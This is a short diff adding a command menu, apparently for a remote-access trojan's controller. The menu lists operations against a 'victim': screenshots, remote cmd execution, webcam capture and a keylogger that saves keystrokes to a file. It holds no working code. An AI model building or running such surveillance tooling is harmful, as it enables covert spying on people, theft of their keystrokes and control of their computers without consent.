@@ -1,0 +1,8 @@
+Enter a command:
+
+screenshot - send the command to the victim and get back form him the screenshot.
+cmd - send the cmd command to the victim's cmd and get the screenshot of the command results.
+webcam - send the command to the victim to open the webcam and get a screenshot while the webcam is active.
+keylis - active a keyboard listener on victim's computer and save the key presses in a .txt file.
+
+*any other input will put down the server (master)*
